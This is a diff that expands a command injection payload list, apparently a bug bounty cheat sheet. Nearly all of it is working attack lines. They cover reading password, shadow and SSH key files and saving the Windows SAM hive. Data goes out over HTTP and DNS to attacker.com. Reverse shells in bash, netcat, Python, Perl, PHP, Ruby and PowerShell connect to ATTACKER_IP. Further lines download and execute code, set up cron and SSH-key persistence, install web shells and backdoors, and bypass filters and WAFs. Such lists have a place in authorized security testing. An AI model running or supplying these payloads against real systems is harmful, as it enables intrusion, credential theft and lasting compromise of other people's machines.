@@ -1,6 +1,10 @@
-# Command Injection Payloads
+# Command Injection Payloads (2020-2025 Enhanced Bug Bounty Edition)
 
-# Basic command injection
+# ============================
+# BASIC COMMAND INJECTION
+# ============================
+
+# Command Separators
 ; ls
 | ls
 || ls
@@ -8,73 +12,561 @@
 && ls
 `ls`
 $(ls)
+%0a ls
+\n ls
 
-# Chained commands
+# Chained Commands
 ; whoami
 | whoami
 || whoami
 & whoami
 && whoami
 
-# Command substitution
+# Command Substitution
 `whoami`
 $(whoami)
 ;`whoami`
 ;$(whoami)
+$((whoami))
 
-# File operations
+# ============================
+# LINUX/UNIX COMMANDS
+# ============================
+
+# File Operations
 ; cat /etc/passwd
 | cat /etc/passwd
 ; cat /etc/shadow
 | cat /etc/shadow
-; ls -la
+; ls -la /
 | ls -la /
+; head -n 50 /etc/passwd
+; tail -n 50 /var/log/auth.log
 
-# Windows commands
+# System Information
+; uname -a
+; hostname
+; id
+; whoami
+; pwd
+; env
+; set
+; printenv
+; cat /proc/version
+; cat /etc/issue
+; cat /etc/*-release
+; ifconfig
+; ip addr
+; route -n
+; netstat -tulpn
+; ps aux
+; w
+; last
+
+# File Discovery
+; find / -name "*.conf" 2>/dev/null
+; find / -name "config*" 2>/dev/null
+; find / -name "*password*" 2>/dev/null
+; find / -perm -4000 2>/dev/null
+; locate password
+; locate admin
+; which gcc
+; which python
+; which perl
+
+# Reading Sensitive Files
+; cat ~/.bash_history
+; cat ~/.ssh/id_rsa
+; cat ~/.ssh/authorized_keys
+; cat /var/www/html/config.php
+; cat /var/www/html/wp-config.php
+; cat /etc/apache2/apache2.conf
+; cat /etc/nginx/nginx.conf
+; cat /root/.ssh/id_rsa
+
+# ============================
+# WINDOWS COMMANDS
+# ============================
+
+# Basic Commands
 & dir
 | dir
+& dir C:\
 & type C:\Windows\win.ini
 | type C:\boot.ini
 & whoami
 | net user
+& hostname
+& ipconfig
+& systeminfo
 
-# Time-based detection
+# Windows System Info
+& systeminfo
+& wmic qfe list
+& wmic logicaldisk get caption
+& net user
+& net localgroup administrators
+& net user /domain
+& net group /domain
+& net group "Domain Admins" /domain
+& tasklist
+& netstat -ano
+& ipconfig /all
+& route print
+& arp -a
+
+# Windows File Operations
+& type C:\Users\Administrator\Desktop\passwords.txt
+& dir C:\Users\
+& dir C:\inetpub\wwwroot\
+& type C:\Windows\System32\drivers\etc\hosts
+& reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+& reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+
+# PowerShell Commands
+& powershell Get-Process
+& powershell Get-Service
+& powershell Get-NetIPConfiguration
+& powershell Get-ComputerInfo
+& powershell Get-LocalUser
+& powershell Get-LocalGroup
+& powershell Get-ChildItem C:\ -Recurse -Include *.txt,*.doc,*.pdf -ErrorAction SilentlyContinue
+& powershell -c "Get-Content C:\Users\Administrator\Desktop\passwords.txt"
+
+# Windows Credential Dumping
+& reg save HKLM\SAM C:\temp\sam.hive
+& reg save HKLM\SYSTEM C:\temp\system.hive
+& reg save HKLM\SECURITY C:\temp\security.hive
+
+# ============================
+# TIME-BASED BLIND INJECTION
+# ============================
+
+# Linux
 ; sleep 5
 | sleep 5
-& ping -n 5 127.0.0.1
-| ping -c 5 127.0.0.1
-; timeout 5
-& timeout /t 5
+|| sleep 5
+& sleep 5
+&& sleep 5
+; sleep 10
+`sleep 5`
+$(sleep 5)
 
-# Output redirection
+# Using ping for delay
+; ping -c 5 127.0.0.1
+| ping -c 10 127.0.0.1
+|| ping -c 5 localhost
+
+# Windows
+& timeout 5
+| timeout 5
+& timeout /t 5
+& ping -n 5 127.0.0.1
+| ping -n 10 127.0.0.1
+& ping 127.0.0.1 -n 5 > nul
+
+# ============================
+# OUTPUT REDIRECTION & EXFILTRATION
+# ============================
+
+# Output to File
 ; ls > /tmp/output.txt
 | ls > /tmp/output.txt
 & dir > C:\temp\output.txt
+; whoami > /var/www/html/whoami.txt
+; cat /etc/passwd > /tmp/passwd.txt
 
-# URL encoded
-%3B%20ls
-%7C%20ls
+# Append to File
+; ls >> /tmp/output.txt
+; whoami >> /var/www/html/info.txt
+
+# Error Redirection
+; ls 2>&1
+; cat /etc/shadow 2>/dev/null
+; find / -name "*.conf" 2>/dev/null
+
+# Data Exfiltration via HTTP
+; curl http://attacker.com?data=$(whoami)
+; wget http://attacker.com/exfil?data=$(cat /etc/passwd | base64)
+; curl -d "data=$(cat /etc/passwd)" http://attacker.com/collect
+& powershell -c "Invoke-WebRequest -Uri http://attacker.com?data=$(whoami) -Method GET"
+
+# DNS Exfiltration
+; nslookup $(whoami).attacker.com
+; dig $(whoami).attacker.com
+; host $(whoami).attacker.com
+
+# ============================
+# ENCODING & OBFUSCATION
+# ============================
+
+# URL Encoding
+%3B%20whoami
+%7C%20whoami
 %26%20whoami
+%0a%20whoami
+%0d%0a%20whoami
 
-# Newline injection
+# Double URL Encoding
+%253B%2520whoami
+%257C%2520whoami
+
+# Unicode Encoding
+\u003b whoami
+
+# Hex Encoding
+\x3b whoami
+\x0a whoami
+
+# Octal Encoding
+\073 whoami
+
+# ============================
+# NEWLINE INJECTION
+# ============================
+
 %0a whoami
 %0d%0a whoami
 \n whoami
 \r\n whoami
+\r whoami
+%0awhoami
+%0d%0awhoami
 
-# Spaces bypass
+# ============================
+# SPACE BYPASS TECHNIQUES
+# ============================
+
+# No Space
 ;cat</etc/passwd
 |cat</etc/passwd
 {cat,/etc/passwd}
 cat${IFS}/etc/passwd
 cat$IFS/etc/passwd
+cat$IFS$9/etc/passwd
+cat${IFS}${PATH%%:*}
 
-# Quotes bypass
+# Brace Expansion
+{cat,/etc/passwd}
+{ls,-la,/}
+
+# Tab Character
+cat%09/etc/passwd
+cat	/etc/passwd
+
+# Variable Expansion
+X=$'cat\x20/etc/passwd'&&$X
+IFS=,;`cat<<<cat,/etc/passwd`
+
+# ============================
+# FILTER BYPASS TECHNIQUES
+# ============================
+
+# Quotes Bypass
 c'a't /etc/passwd
 c"a"t /etc/passwd
 c\at /etc/passwd
+/b''i''n/c''at /etc/passwd
+/\b\i\n/\c\a\t /etc/passwd
 
-# Reverse shell payloads (for authorized testing only - replace YOUR_IP and PORT)
-; nc -e /bin/sh YOUR_IP PORT
-| bash -i >& /dev/tcp/YOUR_IP/PORT 0>&1
-& powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('YOUR_IP',PORT);"
+# Wildcards
+/???/??t /???/??ss??
+/bin/c?t /etc/p?sswd
+/bin/ca* /etc/pass*
+/b*n/c*t /e*c/p*wd
+
+# Variable Substitution
+$PATH
+$HOME
+$PWD
+${PATH:0:1}
+echo ${LS_COLORS:0:1}
+
+# Concatenation
+ca''t /etc/passwd
+c""at /etc/passwd
+c\a\t /etc/passwd
+
+# Case Manipulation (Bash)
+$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
+
+# ============================
+# COMMAND SUBSTITUTION VARIATIONS
+# ============================
+
+`whoami`
+$(whoami)
+$((whoami))
+`echo $(whoami)`
+$(echo `whoami`)
+a=$(whoami);echo $a
+a=`whoami`;echo $a
+
+# ============================
+# REVERSE SHELLS (FOR AUTHORIZED TESTING)
+# ============================
+
+# Bash Reverse Shell
+; bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
+| bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
+; bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'
+; 0<&196;exec 196<>/dev/tcp/ATTACKER_IP/PORT; sh <&196 >&196 2>&196
+
+# NC Reverse Shell
+; nc -e /bin/sh ATTACKER_IP PORT
+; nc ATTACKER_IP PORT -e /bin/bash
+; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f
+
+# Python Reverse Shell
+; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+; python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+# Perl Reverse Shell
+; perl -e 'use Socket;$i="ATTACKER_IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+# PHP Reverse Shell
+; php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+# Ruby Reverse Shell
+; ruby -rsocket -e'f=TCPSocket.open("ATTACKER_IP",PORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+
+# Telnet Reverse Shell
+; telnet ATTACKER_IP PORT | /bin/bash | telnet ATTACKER_IP SECOND_PORT
+
+# Windows PowerShell Reverse Shell
+& powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+# Windows CMD Reverse Shell
+& powershell IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')
+
+# ============================
+# REMOTE CODE EXECUTION (RCE)
+# ============================
+
+# Download and Execute
+; curl http://attacker.com/shell.sh | bash
+; wget http://attacker.com/shell.sh -O- | bash
+; curl http://attacker.com/exploit.py | python
+& certutil -urlcache -split -f http://attacker.com/shell.exe C:\temp\shell.exe
+& powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')"
+
+# Execute In-Memory
+; echo "curl http://attacker.com/payload" | bash
+& powershell -enc BASE64_ENCODED_COMMAND
+
+# ============================
+# SYMBOLIC LINK ATTACKS
+# ============================
+
+# Create Symlink to Sensitive Files
+; ln -s /etc/passwd /var/www/html/passwd.txt
+; ln -s /etc/shadow /tmp/shadow.txt
+; ln -s /root/.ssh/id_rsa /var/www/html/key.txt
+; ln -s /var/www/html/config.php /tmp/config.txt
+
+# Symlink to Directory
+; ln -s /etc/ /var/www/html/etc
+; ln -s /root/ /tmp/root
+; ln -s / /var/www/html/rootfs
+
+# Symlink Overwrite
+; ln -sf /etc/passwd /var/www/html/index.php
+; ln -sf /dev/null /var/log/access.log
+
+# Race Condition with Symlink
+; ln -s /etc/passwd target && cat target
+; ln -s /etc/shadow /tmp/link && cat /tmp/link
+
+# Symlink Arbitrary File Read
+; ln -s /etc/passwd public_html/passwd
+; ln -s ~/.ssh/id_rsa web/key
+
+# Symlink in Archive Extraction (Zip Slip)
+; ln -s /etc/passwd malicious_link
+; tar -czf payload.tar.gz malicious_link
+
+# ============================
+# BLIND COMMAND INJECTION DETECTION
+# ============================
+
+# Time-Based Detection
+|| sleep 5
+& sleep 5 &
+; ping -c 5 127.0.0.1
+| timeout 5
+
+# Out-of-Band (OOB) Detection
+; curl http://burpcollaborator.net
+; wget http://attacker.com/ping
+; nslookup attacker.com
+; ping attacker.com -c 1
+& nslookup attacker.com
+
+# DNS-Based Detection
+; nslookup $(whoami).attacker.com
+; dig $(whoami).attacker.com
+; host $(hostname).attacker.com
+
+# HTTP-Based Detection
+; curl http://attacker.com/?id=injection
+; wget http://attacker.com/?test=injection
+
+# ============================
+# POLYGLOT COMMAND INJECTION
+# ============================
+
+test;whoami
+test|whoami
+test||whoami
+test&whoami
+test&&whoami
+test`whoami`
+test$(whoami)
+test%0awhoami
+test\nwhoami
+
+# ============================
+# ADVANCED FILTER BYPASSES (2023-2025)
+# ============================
+
+# Whitespace Alternatives
+cat</etc/passwd
+cat<>/etc/passwd
+{cat,/etc/passwd}
+X=$'cat\x20/etc/passwd'&&$X
+
+# Null Byte
+cat /etc/passwd%00
+whoami%00
+
+# Comment Injection
+cat /etc/passwd#comment
+whoami#comment
+cat /etc/passwd//comment
+
+# Using $PATH
+${PATH:0:1}bin${PATH:0:1}cat ${PATH:0:1}etc${PATH:0:1}passwd
+
+# Using $HOME
+$HOME/../../etc/passwd
+
+# Glob Characters
+/???/c?t /???/p?ssw?
+
+# ============================
+# WAF/IDS BYPASS
+# ============================
+
+# Case Variations
+Cat /etc/passwd
+CAT /etc/passwd
+cAt /etc/passwd
+
+# Using Tabs
+cat%09/etc/passwd
+
+# Using Line Feed
+cat%0a/etc/passwd
+
+# Combining Techniques
+c''a''t${IFS}/e''t''c/p''a''s''s''w''d
+
+# ============================
+# CONTEXT-SPECIFIC INJECTIONS
+# ============================
+
+# In Email Field
+user@domain.com; whoami
+user@domain.com| whoami
+user@domain.com`whoami`
+
+# In Filename
+file.txt; whoami
+file.txt| cat /etc/passwd
+$(whoami).txt
+
+# In URL
+http://example.com/page?id=1; whoami
+http://example.com/page?id=1| cat /etc/passwd
+
+# ============================
+# CRON JOB INJECTION
+# ============================
+
+# Persistent Access
+; (crontab -l 2>/dev/null; echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'") | crontab -
+; echo "* * * * * curl http://attacker.com/shell.sh | bash" | crontab -
+
+# ============================
+# SSH KEY INJECTION
+# ============================
+
+# Add SSH Key for Persistence
+; echo "ssh-rsa ATTACKER_PUBLIC_KEY" >> ~/.ssh/authorized_keys
+; mkdir -p ~/.ssh && echo "ssh-rsa ATTACKER_PUBLIC_KEY" >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys
+
+# ============================
+# BACKDOOR INSTALLATION
+# ============================
+
+# Web Shell Upload
+; curl http://attacker.com/shell.php -o /var/www/html/shell.php
+; wget http://attacker.com/backdoor.php -O /var/www/html/bd.php
+
+# Binary Download and Execute
+; curl http://attacker.com/backdoor -o /tmp/bd && chmod +x /tmp/bd && /tmp/bd
+; wget http://attacker.com/malware -O /tmp/malware && chmod +x /tmp/malware && /tmp/malware &
+
+# ============================
+# PRIVILEGE ESCALATION CHECKS
+# ============================
+
+# SUID Binaries
+; find / -perm -4000 -type f 2>/dev/null
+; find / -perm -u=s -type f 2>/dev/null
+
+# Sudo Permissions
+; sudo -l
+; cat /etc/sudoers
+
+# Writable Files
+; find / -writable -type f 2>/dev/null
+; find / -perm -222 -type f 2>/dev/null
+
+# ============================
+# LOG POISONING
+# ============================
+
+# Apache/Nginx Log Poisoning
+; echo "<?php system(\$_GET['cmd']); ?>" >> /var/log/apache2/access.log
+; echo "<?php system(\$_GET['cmd']); ?>" >> /var/log/nginx/access.log
+
+# ============================
+# ENVIRONMENT VARIABLE MANIPULATION
+# ============================
+
+; export PATH=/tmp:$PATH
+; echo $PATH
+; printenv
+
+# ============================
+# MODERN TECHNIQUES (2024-2025)
+# ============================
+
+# Abusing Built-in Features
+; source <(curl -s http://attacker.com/script.sh)
+; eval "$(curl -s http://attacker.com/cmd.txt)"
+
+# JavaScript Command Injection (Node.js)
+; node -e "require('child_process').exec('whoami')"
+
+# Using Alternative Shells
+; sh -c whoami
+; bash -c whoami
+; zsh -c whoami
+; ksh -c whoami
+
+# Exploiting Interpreters
+; python -c "import os;os.system('whoami')"
+; perl -e 'system("whoami")'
+; ruby -e 'system("whoami")'
